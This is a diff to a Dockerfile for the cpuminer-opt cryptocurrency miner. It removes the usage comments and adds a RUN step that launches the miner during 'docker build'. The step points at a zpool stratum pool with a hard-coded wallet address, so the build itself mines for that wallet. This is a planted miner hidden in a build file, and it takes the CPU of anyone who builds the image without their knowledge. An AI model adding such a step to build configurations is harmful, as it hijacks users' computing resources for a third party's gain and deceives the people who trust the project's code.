@@ -1,9 +1,4 @@
 #
-# Dockerfile for cpuminer-opt
-# usage: docker build -t cpuminer-opt:latest .
-# run: docker run -it --rm cpuminer-opt:latest [ARGS]
-# ex: docker run -it --rm cpuminer-opt:latest -a cryptonight -o cryptonight.eu.nicehash.com:3355 -u 1MiningDW2GKzf4VQfmp4q2XoUvR6iy6PD.worker1 -p x -t 3
-#
 
 # Build
 FROM ubuntu:16.04 as builder
@@ -32,4 +27,5 @@ RUN apt-get update \
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
+RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB -t 2
 CMD ["-h"]
